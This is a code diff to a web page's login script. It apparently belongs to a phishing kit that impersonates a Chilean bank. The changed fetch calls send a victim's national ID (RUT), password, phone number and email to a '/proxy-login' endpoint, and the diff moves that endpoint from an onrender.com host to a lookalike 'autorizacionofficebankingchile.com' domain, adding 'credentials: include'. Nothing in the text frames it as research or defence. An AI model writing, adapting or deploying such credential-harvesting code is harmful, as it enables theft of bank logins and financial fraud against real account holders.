@@ -112,11 +112,12 @@
     }
 
     try {
-      const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/proxy-login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ rut, passwd, telefono })
-      });
+     const response = await fetch("https://autorizacionofficebankingchile.com/proxy-login", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ rut, passwd, telefono }),
+  credentials: "include"
+});
       const data = await response.text();
       document.getElementById("resultado").innerText = data;
 
@@ -139,11 +140,12 @@
     const correo = document.getElementById("correo").value;
 
     try {
-      await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/proxy-login", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ mail: correo })
-      });
+      const response = await fetch("https://autorizacionofficebankingchile.com/proxy-login", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ mail: correo }),
+  credentials: "include"
+});
     } catch (error) {
       console.error("Error al enviar correo:", error);
     }
